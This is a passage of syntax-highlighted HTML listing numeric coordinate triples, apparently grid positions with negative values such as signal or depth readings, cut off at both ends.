class="hljs-number">4.2</span>),<br>(<span class="hljs-number">98</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">3.9</span>),<br>(<span class="hljs-number">12</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6.2</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">2.7</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">5.3</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">7</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">5.9</span>),<br>(<span class="hljs-number">23</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">2.4</span>),<br>(<span class="hljs-number">24</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">3.9</span>),<br>(<span class="hljs-number">31</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">7</span>),<br>(<span class="hljs-number">32</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6.5</span>),<br>(<span class="hljs-number">33</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">4.1</span>),<br>(<span class="hljs-number">34</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">2.3</span>),<br>(<span class="hljs-number">35</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">4.8</span>),<br>(<span class="hljs-number">40</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">5.7</span>),<br>(<span class="hljs-number">41</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6.7</span>),<br>(<span class="hljs-number">42</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6.7</span>),<br>(<span class="hljs-number">43</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">5.1</span>),<br>(<span class="hljs-number">44</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6.6</span>),<br>(<span class="hljs-number">45</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">4.4</span>),<br>(<span class="hljs-number">50</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">3.5</span>),<br>(<span class="hljs-number">51</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">2.5</span>),<br>(<span class="hljs-number">58</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6.7</span>),<br>(<span class="hljs-number">59</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">4.8</span>),<br>(<span class="hljs-number">60</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6.4</span>),<br>(<span class="hljs-number">61</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">3</span>),<br>(<span class="hljs-number">62</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6.9</span>),<br>(<span class="hljs-number">63</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">4.6</span>),<br>(<span class="hljs-number">67</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6.5</span>),<br>(<span class="hljs-number">68</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">5.2</span>),<br>(<span class="hljs-number">69</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">3.9</span>),<br>(<span class="hljs-number">70</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6.8</span>),<br>(<span class="hljs-number">71</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">4.2</span>),<br>(<span class="hljs-number">76</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">3.5</span>),<br>(<span class="hljs-number">77</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6.9</span>),<br>(<span class="hljs-number">78</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">5.7</span>),<br>(<span class="hljs-number">79</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6</span>),<br>(<span class="hljs-number">80</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">3.3</span>),<br>(<span class="hljs-number">81</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">3.4</span>),<br>(<span class="hljs-number">85</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">2.5</span>),<br>(<span class="hljs-number">86</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6.3</span>),<br>(<span class="hljs-number">87</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">3.6</span>),<br>(<span class="hljs-number">88</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">7</span>),<br>(<span class="hljs-number">89</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">2.5</span>),<br>(<span class="hljs-number">94</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">4.3</span>),<br>(<span class="hljs-number">95</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">4.1</span>),<br>(<span class="hljs-number">96</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">6.9</span>),<br>(<span class="hljs-number">97</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">2.6</span>),<br>(<span class="hljs-number">98</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">3.7</span>),<br>(<span class="hljs-number">99</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">2.3</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">3.1</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">3.5</span>),<br>(<span class="hljs-number">24</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">5.9</span>),<br>(<span class="hljs-number">25</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">4.4</span>),<br>(<span class="hljs-number">62</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">2.2</span>),<br>(<span class="hljs-number">63</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">6.1</span>),<br>(<span class="hljs-number">98</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">4.2</span>),<br>(<span class="hljs-number">99</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">4.5</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">5</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">5.8</span>),<br>(<span class="hljs-number">24</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">2.1</span>),<br>(<span class="hljs-number">25</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">6.4</span>),<br>(<span class="hljs-number">62</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">5.7</span>),<br>(<span class="hljs-number">63</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">2.2</span>),<br>(<span class="hljs-number">98</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">6.5</span>),<br>(<span class="hljs-number">99</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">2.4</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">5.3</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">5.9</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">2.2</span>),<br>(<span class="hljs-number">18</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">5.9</span>),<br>(<span class="hljs-number">19</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">6.5</span>),<br>(<span class="hljs-number">24</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">5</span>),<br>(<span class="hljs-number">25</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">4.4</span>),<br>(<span class="hljs-number">26</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">4.9</span>),<br>(<span class="hljs-number">63</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">6.3</span>),<br>(<span class="hljs-number">64</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">2.3</span>),<br>(<span class="hljs-number">99</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">4.6</span>),<br>(<span class="hljs-number">100</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">4.6</span>),<br>(-<span class="hljs-number">7</span>, -<span class="hljs-number">22</span>, -<span class="hljs-number">69.8</span>),<br>(-<span class="hljs-number">6</span>, -<span class="hljs-number">22</span>, -<span class="hljs-number">66.8</span>),<br>(-<span class="hljs-number">5</span>, -<span class="hljs-number">22</span>, -<span class="hljs-number">66.5</span>),<br>(-<span class="hljs-number">8</span>, -<span class="hljs-number">21</span>, -<span class="hljs-number">67.4</span>),<br>(-<span class="hljs-number">7</span>, -<span class="hljs-number">21</span>, -<span class="hljs-number">70</span>),<br>(-<span class="hljs-number">6</span>, -<span class="hljs-number">21</span>, -<span class="hljs-number">69.7</span>),<br>(-<span class="hljs-number">5</span>, -<span class="hljs-number">21</span>, -<span class="hljs-number">65.4</span>),<br>(-<span class="hljs-number">4</span>, -<span class="hljs-number">21</span>, -<span class="hljs-number">65.8</span>),<br>(-<span class="hljs-number">9</span>, -<span class="hljs-number">20</span>, -<span class="hljs-number">68</span>),<br>(-<span class="hljs-number">8</span>, -<span class="hljs-number">20</span>, -<span class="hljs-number">68.4</span>),<br>(-<span class="hljs-number">7</span>, -<span class="hljs-number">20</span>, -<span class="hljs-number">66</span>),<br>(-<span class="hljs-number">6</span>, -<span class="hljs-number">20</span>, -<span class="hljs-number">65.5</span>),<br>(-<span class="hljs-number">5</span>, -<span class="hljs-number">20</span>, -<span class="hljs-number">66.7</span>),<br>(-<span class="hljs-number">4</span>, -<span class="hljs-number">20</span>, -<span class="hljs-number">65.2</span>),<br>(-<span class="hljs-number">3</span>, -<span class="hljs-number">20</span>, -<span class="hljs-number">67.9</span>),<br>(-<span class="hljs-number">10</span>, -<span class="hljs-number">19</span>, -<span class="hljs-number">66.8</span>),<br>(-<span class="hljs-number">9</span>, -<span class="hljs-number">19</span>, -<span class="hljs-number">68.7</span>),<br>(-<span class="hljs-number">8</span>, -<span class="hljs-number">19</span>, -<span class="hljs-number">68.9</span>),<br>(-<span class="hljs-number">7</span>, -<span class="hljs-number">19</span>, -<span class="hljs-number">68.1</span>),<br>(-<span class="hljs-number">6</span>, -<span class="hljs-number">19</span>, -<span class="hljs-number">69.5</span>),<br>(-<span class="hljs-number">5</span>, -<span class="hljs-number">19</span>, -<span class="hljs-number">66.5</span>),<br>(-<span class="hljs-number">4</span>, -<span class="hljs-number">19</span>, -<span class="hljs-number">69.4</span>),<br>(-<span class="hljs-number">3</span>, -<span class="hljs-number">19</span>, -<span class="hljs-number">67</span>),<br>(-<span class="hljs-number">2</span>, -<span class="hljs-number">19</span>, -<span class="hljs-number">65.6</span>),<br>(-<span class="hljs-number">11</span>, -<span class="hljs-number">18</span>, -<span class="hljs-number">68.6</span>),<br>(-<span class="hljs-number">10</span>, -<span class="hljs-number">18</span>, -<span class="hljs-number">69.2</span>),<br>(-<span class="hljs-number">9</span>, -<span class="hljs-number">18</span>, -<span class="hljs-number">66.8</span>),<br>(-<span class="hljs-number">8</span>, -<span class="hljs-number">18</span>, -<span class="hljs-number">65.4</span>),<br>(-<span class="hljs-number">7</span>, -<span class="hljs-number">18</span>, -<span class="hljs-number">69.6</span>),<br>(-<span class="hljs-number">6</span>, -<span class="hljs-number">18</span>, -<span class="hljs-number">66.1</span>),<br>(-<span class="hljs-number">5</span>, -<span class="hljs-number">18</span>, -<span class="hljs-number">66.4</span>),<br>(-<span class="hljs-number">4</span>, -<span class="hljs-number">18</span>, -<span class="hljs-number">65.8</span>),<br>(-<span class="hljs-number">3</span>, -<span class="hljs-number">18</span>, -<span class="hljs-number">68.6</span>),<br>(-<span class="hljs-number">2</span>, -<span class="hljs-number">18</span>, -<span class="hljs-number">66.4</span>),<br>(-<span class="hljs-number">1</span>, -<span class="hljs-number">18</span>, -<span class="hljs-number">68.4</span>),<br>(-<span class="hljs-number">12</span>, -<span class="hljs-number">17</span>, -<span class="hljs-number">65.3</span>),<br>(-<span class="hljs-number">11</span>, -<span class="hljs-number">17</span>, -<span class="hljs-number">67.4</span>),<br>(-<span class="hljs-number">10</span>, -<span class="hljs-number">17</span>, -<span class="hljs-number">68.8</span>),<br>(-<span class="hljs-number">9</span>, -<span class="hljs-number">17</span>, -<span class="hljs-number">67.2</span>),<br>(-<span class="hljs-number">8</span>, -<span class="hljs-number">17</span>, -<span class="hljs-number">69.4</span>),<br>(-<span class="hljs-number">7</span>, -<span class="hljs-number">17</span>, -<span class="hljs-number">69.9</span>),<br>(-<span class="hljs-number">6</span>, -<span class="hljs-number">17</span>, -<span class="hljs-number">65.3</span>),<br>(-<span class="hljs-number">5</span>, -<span class="hljs-number">17</span>, -<span class="hljs-number">69.9</span>),<br>(-<span class="hljs-number">4</span>, -<span class="hljs-number">17</span>, -<span class="hljs-number">65.2</span>),<br>(-<span class="hljs-number">3</span>, -<span class="hljs-number">17</span>, -<span class="hljs-number">65.6</span>),<br>(-<span class="hljs-number">2</span>, -<span class="hljs-number">17</span>, -<span class="hljs-number">67.1</span>),<br>(-<span class="hljs-number">1</span>, -<span class="hljs-number">17</span>, -<span class="hljs-number">67.9</span>),<br>(<span class="hljs-number">0</span>, -<span class="hljs-number">17</span>, -<span class="hljs-number">68.5</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">69.1</span>),<br>(-<span class="hljs-number">12</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">67.2</span>),<br>(-<span class="hljs-number">11</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">69.3</span>),<br>(-<span class="hljs-number">10</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">66.8</span>),<br>(-<span class="hljs-number">9</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">68.2</span>),<br>(-<span class="hljs-number">8</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">67.9</span>),<br>(-<span class="hljs-number">7</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">67.1</span>),<br>(-<span class="hljs-number">5</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">65.8</span>),<br>(-<span class="hljs-number">4</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">66.5</span>),<br>(-<span class="hljs-number">3</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">65.1</span>),<br>(-<span class="hljs-number">2</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">68.7</span>),<br>(-<span class="hljs-number">1</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">69</span>),<br>(<span class="hljs-number">0</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">69.7</span>),<br>(<span class="hljs-number">1</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">65.6</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">70</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">69.5</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">16</span>, -<span class="hljs-number">65.1</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">69.1</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">66.3</span>),<br>(-<span class="hljs-number">12</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">67.3</span>),<br>(-<span class="hljs-number">11</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">69.7</span>),<br>(-<span class="hljs-number">10</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">69</span>),<br>(-<span class="hljs-number">9</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">66.6</span>),<br>(-<span class="hljs-number">8</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">65.6</span>),<br>(-<span class="hljs-number">4</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">65.9</span>),<br>(-<span class="hljs-number">3</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">65.5</span>),<br>(-<span class="hljs-number">2</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">68.9</span>),<br>(-<span class="hljs-number">1</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">70</span>),<br>(<span class="hljs-number">0</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">67.7</span>),<br>(<span class="hljs-number">1</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">67.9</span>),<br>(<span class="hljs-number">2</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">69.1</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">66.2</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">65.3</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">66</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">67.1</span>),<br>(<span class="hljs-number">20</span>, -<span class="hljs-number">15</span>, -<span class="hljs-number">65.9</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">67.4</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">65.2</span>),<br>(-<span class="hljs-number">12</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">68.9</span>),<br>(-<span class="hljs-number">11</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">66.5</span>),<br>(-<span class="hljs-number">10</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">68.6</span>),<br>(-<span class="hljs-number">9</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">69.6</span>),<br>(-<span class="hljs-number">3</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">68.8</span>),<br>(-<span class="hljs-number">2</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">67.9</span>),<br>(-<span class="hljs-number">1</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">0</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">67.8</span>),<br>(<span class="hljs-number">1</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">68.7</span>),<br>(<span class="hljs-number">2</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">66.2</span>),<br>(<span class="hljs-number">3</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">69.9</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">67.5</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">67.9</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">67</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">66.6</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">20</span>, -<span class="hljs-number">14</span>, -<span class="hljs-number">68.5</span>),<br>(-<span class="hljs-number">15</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">66</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">67.8</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">66.2</span>),<br>(-<span class="hljs-number">12</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">69.4</span>),<br>(-<span class="hljs-number">11</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">67.6</span>),<br>(-<span class="hljs-number">10</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">66.2</span>),<br>(-<span class="hljs-number">2</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">67.2</span>),<br>(-<span class="hljs-number">1</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">70</span>),<br>(<span class="hljs-number">0</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">68.9</span>),<br>(<span class="hljs-number">1</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">68</span>),<br>(<span class="hljs-number">2</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">68</span>),<br>(<span class="hljs-number">3</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">4</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">65.4</span>),<br>(<span class="hljs-number">14</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">66.4</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">68.3</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">68.7</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">68.7</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">69.9</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">66.3</span>),<br>(<span class="hljs-number">20</span>, -<span class="hljs-number">13</span>, -<span class="hljs-number">65.2</span>),<br>(-<span class="hljs-number">16</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">69.9</span>),<br>(-<span class="hljs-number">15</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">66.9</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">69.7</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">67.2</span>),<br>(-<span class="hljs-number">12</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">69.6</span>),<br>(-<span class="hljs-number">11</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">70</span>),<br>(-<span class="hljs-number">10</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">68.8</span>),<br>(-<span class="hljs-number">1</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">65.5</span>),<br>(<span class="hljs-number">0</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">67</span>),<br>(<span class="hljs-number">1</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">69.7</span>),<br>(<span class="hljs-number">2</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">66.9</span>),<br>(<span class="hljs-number">3</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">66.8</span>),<br>(<span class="hljs-number">4</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">65.5</span>),<br>(<span class="hljs-number">5</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">65.6</span>),<br>(<span class="hljs-number">13</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">69.2</span>),<br>(<span class="hljs-number">14</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">69.8</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">67.7</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">67.7</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">69.5</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">69.8</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">68</span>),<br>(<span class="hljs-number">20</span>, -<span class="hljs-number">12</span>, -<span class="hljs-number">66.1</span>),<br>(-<span class="hljs-number">17</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">65.2</span>),<br>(-<span class="hljs-number">16</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">67.9</span>),<br>(-<span class="hljs-number">15</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">70</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">69.4</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">65.8</span>),<br>(-<span class="hljs-number">12</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">65.1</span>),<br>(-<span class="hljs-number">11</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">66.8</span>),<br>(<span class="hljs-number">0</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">67.5</span>),<br>(<span class="hljs-number">1</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">65.2</span>),<br>(<span class="hljs-number">2</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">67.3</span>),<br>(<span class="hljs-number">3</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">66.3</span>),<br>(<span class="hljs-number">4</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">65.4</span>),<br>(<span class="hljs-number">5</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">68.3</span>),<br>(<span class="hljs-number">6</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">69.6</span>),<br>(<span class="hljs-number">12</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">68.5</span>),<br>(<span class="hljs-number">13</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">66.4</span>),<br>(<span class="hljs-number">14</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">65.2</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">65.5</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">65.2</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">65.8</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">66.3</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">68.4</span>),<br>(<span class="hljs-number">20</span>, -<span class="hljs-number">11</span>, -<span class="hljs-number">66.6</span>),<br>(-<span class="hljs-number">18</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">66.4</span>),<br>(-<span class="hljs-number">17</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">65.9</span>),<br>(-<span class="hljs-number">16</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">66.6</span>),<br>(-<span class="hljs-number">15</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">68.8</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">65.3</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">68.8</span>),<br>(-<span class="hljs-number">12</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">65.6</span>),<br>(<span class="hljs-number">1</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">66.4</span>),<br>(<span class="hljs-number">2</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">3</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">66.4</span>),<br>(<span class="hljs-number">4</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">68.7</span>),<br>(<span class="hljs-number">5</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">69.6</span>),<br>(<span class="hljs-number">6</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">67.2</span>),<br>(<span class="hljs-number">7</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">65.8</span>),<br>(<span class="hljs-number">11</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">69.4</span>),<br>(<span class="hljs-number">12</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">66.1</span>),<br>(<span class="hljs-number">13</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">66.6</span>),<br>(<span class="hljs-number">14</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">67.8</span>),<br>(<span class="hljs-number">15</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">65.1</span>),<br>(<span class="hljs-number">16</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">69.8</span>),<br>(<span class="hljs-number">17</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">70</span>),<br>(<span class="hljs-number">18</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">68</span>),<br>(<span class="hljs-number">19</span>, -<span class="hljs-number">10</span>, -<span class="hljs-number">68.9</span>),<br>(-<span class="hljs-number">19</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">67.2</span>),<br>(-<span class="hljs-number">18</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">66.4</span>),<br>(-<span class="hljs-number">17</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">70</span>),<br>(-<span class="hljs-number">16</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">68.8</span>),<br>(-<span class="hljs-number">15</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">68.7</span>),<br>(-<span class="hljs-number">14</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">68.3</span>),<br>(-<span class="hljs-number">13</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">65.8</span>),<br>(<span class="hljs-number">2</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">69.2</span>),<br>(<span class="hljs-number">3</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">67.3</span>),<br>(<span class="hljs-number">4</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">67.6</span>),<br>(<span class="hljs-number">5</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">67.8</span>),<br>(<span class="hljs-number">6</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">67</span>),<br>(<span class="hljs-number">7</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">68.7</span>),<br>(<span class="hljs-number">8</span>, -<span class="hljs-number">9</span>, -<span class="hljs-number">66.2</span>),<br>(<span 